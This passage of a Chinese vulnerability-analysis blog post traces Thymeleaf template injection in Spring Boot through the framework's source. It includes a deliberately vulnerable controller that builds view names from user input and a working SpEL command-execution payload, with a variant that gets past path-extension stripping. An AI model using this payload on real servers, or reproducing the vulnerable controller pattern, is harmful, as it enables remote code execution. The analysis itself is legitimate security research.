class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">excludes</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">exclude</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">exclude</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">excludes</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br><br></code></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>测试Thymeleaf模板注入<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">th:action</span>=<span class="hljs-string">&quot;@&#123;/test&#125;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;path&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;payload&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> </span>&#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String path)</span></span>&#123;<br>        log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xxx/&quot;</span> + path + <span class="hljs-string">&quot;/zzz&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里直接从<code>org.springframework.web.servlet.DispatcherServlet</code>开始进行分析</p>
<p>从DispatcherServlet【前置控制器】开始，如过对SpringMVC比较熟悉可以直接F8，不熟悉的话，可以像我一样，选择性不看😅，这里有个简单的关于doDispatch的说明</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    HttpServletRequest processedRequest = request;<br>    HandlerExecutionChain mappedHandler = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">boolean</span> multipartRequestParsed = <span class="hljs-keyword">false</span>;<br>    WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            ModelAndView mv = <span class="hljs-keyword">null</span>;<br>            Object dispatchException = <span class="hljs-keyword">null</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// 检查是否是文件上传请求</span><br>                processedRequest = <span class="hljs-keyword">this</span>.checkMultipart(request);<br>                multipartRequestParsed = processedRequest != request;<br>                <span class="hljs-comment">// checkMultipart() 当不是文件上传的请求时，不会做任何操作</span><br>                mappedHandler = <span class="hljs-keyword">this</span>.getHandler(processedRequest);<br>                <span class="hljs-comment">// 如果没有符合该请求的适配器(mapperHandler),将会直接返回404</span><br>                <span class="hljs-keyword">if</span> (mappedHandler == <span class="hljs-keyword">null</span>) &#123;<br>                    <span class="hljs-keyword">this</span>.noHandlerFound(processedRequest, response);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-comment">// 获取与请求相符的HandlerAdapter（适配器）</span><br>                HandlerAdapter ha = <span class="hljs-keyword">this</span>.getHandlerAdapter(mappedHandler.getHandler());<br>                String method = request.getMethod();<span class="hljs-comment">// 获取请求方法</span><br>                <span class="hljs-keyword">boolean</span> isGet = HttpMethod.GET.matches(method); <span class="hljs-comment">// 判断是否为get方法</span><br>                <span class="hljs-comment">// 检查是否是HttpMethod中存在的方法,请求方法为GET则进入</span><br>                <span class="hljs-keyword">if</span> (isGet || HttpMethod.HEAD.matches(method)) &#123;<br>                    <span class="hljs-keyword">long</span> lastModified = ha.getLastModified(request, mappedHandler.getHandler());<br>                    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">new</span> ServletWebRequest(request, response)).checkNotModified(lastModified) &amp;&amp; isGet) &#123;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-comment">// 拦截器，执行preHandle拦截器</span><br>                <span class="hljs-keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-comment">// 执行Controller【请求处理器】中的相应方法【处理请求，做出响应】</span><br>                mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br>                <span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>				<span class="hljs-comment">// 获取视图View</span><br>                <span class="hljs-keyword">this</span>.applyDefaultViewName(processedRequest, mv);<br>                <span class="hljs-comment">// 拦截器后置处理</span><br>                mappedHandler.applyPostHandle(processedRequest, response, mv);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var20) &#123;<br>                dispatchException = var20;<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable var21) &#123;<br>                dispatchException = <span class="hljs-keyword">new</span> NestedServletException(<span class="hljs-string">&quot;Handler dispatch failed&quot;</span>, var21);<br>            &#125;<br>            <span class="hljs-comment">// 利用mv进行页面渲染</span><br>            <span class="hljs-keyword">this</span>.processDispatchResult(processedRequest, response, mappedHandler, mv, (Exception)dispatchException);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var22) &#123;<br>            <span class="hljs-keyword">this</span>.triggerAfterCompletion(processedRequest, response, mappedHandler, var22);<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable var23) &#123;<br>            <span class="hljs-comment">// 完成页面渲染并调用拦截器的afterCompletion()</span><br>            <span class="hljs-keyword">this</span>.triggerAfterCompletion(processedRequest, response, mappedHandler, <span class="hljs-keyword">new</span> NestedServletException(<span class="hljs-string">&quot;Handler processing failed&quot;</span>, var23));<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-comment">// 判断是否是异步请求</span><br>        <span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br>            <span class="hljs-keyword">if</span> (mappedHandler != <span class="hljs-keyword">null</span>) &#123;<br>                mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (multipartRequestParsed) &#123;<br>            <span class="hljs-comment">// 删除上传的资源</span><br>            <span class="hljs-keyword">this</span>.cleanupMultipart(processedRequest);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A51.png" srcset="/img/loading.gif" lazyload></p>
<p>来到第517行，进入视图渲染的地方，该方法前面只是一些参数的定义和判断</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A52.png" srcset="/img/loading.gif" lazyload></p>
<p>直接到来第570行，跟进render()【render()方法，看名字–&gt;视图渲染】</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A53.png" srcset="/img/loading.gif" lazyload></p>
<p>同样方法的前面不怎么需要关注，但719行可以稍微看一下【获取最优视图解析器】</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Nullable</span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> View <span class="hljs-title">resolveViewName</span><span class="hljs-params">(String viewName, <span class="hljs-meta">@Nullable</span> Map&lt;String, Object&gt; model, Locale locale, HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.viewResolvers != <span class="hljs-keyword">null</span>) &#123;	<span class="hljs-comment">// 判断当前IOC容器中是否有视图解析器</span><br>        Iterator var5 = <span class="hljs-keyword">this</span>.viewResolvers.iterator();	<span class="hljs-comment">// 将所有的视图解析器放到一个迭代器里面进行循环</span><br><br>        <span class="hljs-keyword">while</span>(var5.hasNext()) &#123;	<span class="hljs-comment">// 循环找出最优视图解析器</span><br>            ViewResolver viewResolver = (ViewResolver)var5.next();<br>            <span class="hljs-comment">// 根据该方法中的 getBestView() 寻找最优视图解析器</span><br>            View view = viewResolver.resolveViewName(viewName, locale);<br>            <span class="hljs-keyword">if</span> (view != <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> view;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A54.png" srcset="/img/loading.gif" lazyload></p>
<p>来到739行，调用获取到的视图解析器的render()，继续跟进</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A55.png" srcset="/img/loading.gif" lazyload></p>
<p>此时来到<code>org.thymeleaf.spring5.view.ThymeleafView</code></p>
<p>ThymeleafView中的render()又去调用renderFragment()对视图进行渲染，跟进</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A56.png" srcset="/img/loading.gif" lazyload></p>
<p><code>renderFragment()</code>前面部分同样是一些参数的定义与判断，单步来到ThymeleafView的101行，猜测此处判断视图渲染中是否存在<strong>片段表达式</strong></p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A57.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A58.png" srcset="/img/loading.gif" lazyload></p>
<p>单步向下，来到Class ThymeleafView的109行，此处开始处理表达式，跟进。此处再viewTemplateName外增加了<code>~&#123;...&#125;~</code>，也就是片段表达式的样子，</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A59.png" srcset="/img/loading.gif" lazyload></p>
<p>来到<code>org.thymeleaf.standard.expression.StandardExpressionParser</code>的第41行</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A510.png" srcset="/img/loading.gif" lazyload></p>
<p>进行一个三步运算，预处理的值，换个思路也就是，判断一下是否存在需要执行的表达式，如果有则执行一下表达式，没有则直接返回，跟进，因为preprocess传入的值是true，所以一定是执行<code>StandardExpressionPreprocessor.preprocess(context, input)</code></p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A511.png" srcset="/img/loading.gif" lazyload></p>
<p>来到<code>org.thymeleaf.standard.expression.StandardExpressionPreprocessor</code>第17行，先是判断一下是否存在<code>_</code>，也就是想看一下是否存在需要预处理的东西</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A512.png" srcset="/img/loading.gif" lazyload></p>
<p>正则匹配，根据该类定义的正则表达式进行匹配</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">char</span> PREPROCESS_DELIMITER = <span class="hljs-string">&#x27;_&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String PREPROCESS_EVAL = <span class="hljs-string">&quot;\\_\\_(.*?)\\_\\_&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Pattern PREPROCESS_EVAL_PATTERN = Pattern.compile(<span class="hljs-string">&quot;\\_\\_(.*?)\\_\\_&quot;</span>, <span class="hljs-number">32</span>);<br></code></pre></td></tr></table></figure>

<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A513.png" srcset="/img/loading.gif" lazyload></p>
<p>然后是判断一下没有匹配到东西，没有匹配到<code>return checkPreprocessingMarkUnescaping(input);</code></p>
<p>接下来进入<code>do...while&#123;&#125;</code>循环,去判断一下预处理表达式中是否包含了另一个预处理表达式</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">do</span> &#123;<br>    remaining = checkPreprocessingMarkUnescaping(input.substring(curr, matcher.start(<span class="hljs-number">0</span>)));	<br>    String expressionText = checkPreprocessingMarkUnescaping(matcher.group(<span class="hljs-number">1</span>));	<span class="hljs-comment">// 提取双下划线中间的值</span><br>    strBuilder.append(remaining);	<br>    IStandardExpression expression = StandardExpressionParser.parseExpression(context, expressionText, <span class="hljs-keyword">false</span>);	<span class="hljs-comment">// 又来了一遍刚才那个三目运算，猜测应该是判断是否表达式里面包含表达式</span><br>    <span class="hljs-keyword">if</span> (expression == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>	<span class="hljs-comment">// 执行表达式的地方</span><br>    Object result = expression.execute(context, StandardExpressionExecutionContext.RESTRICTED);<br>    strBuilder.append(result);<br>    curr = matcher.end(<span class="hljs-number">0</span>);<br>&#125; <span class="hljs-keyword">while</span>(matcher.find());<br></code></pre></td></tr></table></figure>

<p>跟进之后，来到<code>org.thymeleaf.standard.expression.Expression</code>的第54行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// class  org.thymeleaf.standard.expression.Expression  execute()</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">execute</span><span class="hljs-params">(IExpressionContext context, StandardExpressionExecutionContext expContext)</span> </span>&#123;<br>    Validate.notNull(context, <span class="hljs-string">&quot;Context cannot be null&quot;</span>);	<span class="hljs-comment">// context是否为空</span><br>    IStandardVariableExpressionEvaluator variableExpressionEvaluator = StandardExpressions.getVariableExpressionEvaluator(context.getConfiguration());	<span class="hljs-comment">// 获取表达式解析引擎，此处为SpringEL</span><br>    Object result = execute(context, <span class="hljs-keyword">this</span>, variableExpressionEvaluator, expContext);	<span class="hljs-comment">// 执行，继续跟进</span><br>    <span class="hljs-keyword">return</span> LiteralValue.unwrap(result);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A514.png" srcset="/img/loading.gif" lazyload></p>
<p>来到第40行，判断表达式是否为简单的表达式【也就是Thymeleaf中常用的那几个】</p>
<p>跟进<code>SimpleExpression.executeSimple(context, (SimpleExpression)expression, expressionEvaluator, expContext);</code></p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A515.png" srcset="/img/loading.gif" lazyload></p>
<p>来到<code>org.thymeleaf.standard.expression.SimpleExpression</code>的第20行，判断传入的为何种表达式类型，然后根据传入进行选择，继续跟进</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A516.png" srcset="/img/loading.gif" lazyload></p>
<p>来到<code>org.thymeleaf.standard.expression.VariableExpression</code>第74行，走到79行</p>
<p>expressionEvaluator为获取到的表达式解析器</p>
<p>expression为传入的值【经过一系列处理的值】</p>
<p>继续跟进</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A517.png" srcset="/img/loading.gif" lazyload></p>
<p>来到<code>org.thymeleaf.spring5.expression.SPELVariableExpressionEvaluator</code>第20行，单步向下</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A518.png" srcset="/img/loading.gif" lazyload></p>
<p>继续向下，走到第90行</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A519.png" srcset="/img/loading.gif" lazyload></p>
<p>再往下就是SpringEL表达式的东西了，就不是我能看懂的了，所以也就不继续向下跟了，到这里基本上算是Thymeleaf的东西跟完了，执行一下</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A520.png" srcset="/img/loading.gif" lazyload></p>
<p>简单总结一下</p>
<p>1.获取ViewAndModle对象</p>
<p>2.根据View选择最优视图解析器进行render()</p>
<p>3.进入Thymeleaf视图解析器之后，判断是否存在<code>::</code>，存在的话则进行表达式的处理</p>
<p>4.在判断是否存在<code>_</code>，存在则认为是有需要预处理的语句</p>
<p>5.根据传入内容，选择相应的表达式处理器</p>
<p>6.执行SpringEL表达式</p>
<h4 id="场景2"><a href="#场景2" class="headerlink" title="场景2"></a>场景2</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/test/&#123;path&#125;&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">vulTest02</span><span class="hljs-params">()</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;Test02&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这种场景下，其实现的原理基本是相同的，需要注意的是exp需要改变一下，需要在原本的exp最后加上一个.</p>
<p>exp：<code>::__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream()).next()&#125;__.</code></p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A522.png" srcset="/img/loading.gif" lazyload></p>
<p>这是因为springMVC在接收到此类请求时，会对地址进行一个处理，会将最后一个点<code>.</code>之后的数据裁剪掉</p>
<p>还是<code>DispatcherServlet</code>中ha.handler处下断，来到第509行处，跟进</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A523.png" srcset="/img/loading.gif" lazyload></p>
<p>来到<code>applyDefaultViewName</code>方法，继续跟进第536行</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A524.png" srcset="/img/loading.gif" lazyload></p>
<p>来到，此处没有进行处理，继续跟进就完了</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A525.png" srcset="/img/loading.gif" lazyload></p>
<p>来到<code>org.springframework.web.servlet.view.DefaultRequestToViewNameTranslator</code>，继续跟进第72行</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A526.png" srcset="/img/loading.gif" lazyload></p>
<p>来到<code>transformPath()</code></p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A527.png" srcset="/img/loading.gif" lazyload></p>
<p><code>stripFilenameExtension()</code>详情如下，就是将最后一个点<code>.</code>以及该点之后的内容裁剪掉</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">stripFilenameExtension</span><span class="hljs-params">(String path)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> extIndex = path.lastIndexOf(<span class="hljs-number">46</span>);		<span class="hljs-comment">// 46对应ASCII码中的 . </span><br>    <span class="hljs-keyword">if</span> (extIndex == -<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> path;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">int</span> folderIndex = path.lastIndexOf(<span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-keyword">return</span> folderIndex &gt; extIndex ? path : path.substring(<span class="hljs-number">0</span>, extIndex);	<span class="hljs-comment">// 裁剪</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>到这里exp需要变形的地方就通透了，一路返回到<code>DispatcherServlet</code>的509行就ok，再然后就和场景1相同了</p>
<h3 id="0x04-修复方案"><a href="#0x04-修复方案" class="headerlink" title="0x04 修复方案"></a>0x04 修复方案</h3><h4 id="1-升级新版"><a href="#1-升级新版" class="headerlink" title="1.升级新版"></a>1.升级新版</h4><p>此处复现时选用的thymeleaf版本是3.0.11，到目前为止已经有了有了3.0.15</p>
<h5 id="3-0-12-场景1绕过"><a href="#3-0-12-场景1绕过" class="headerlink" title="3.0.12 场景1绕过"></a>3.0.12 场景1绕过</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String path)</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xxx/&quot;</span> + path + <span class="hljs-string">&quot;/zzz&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

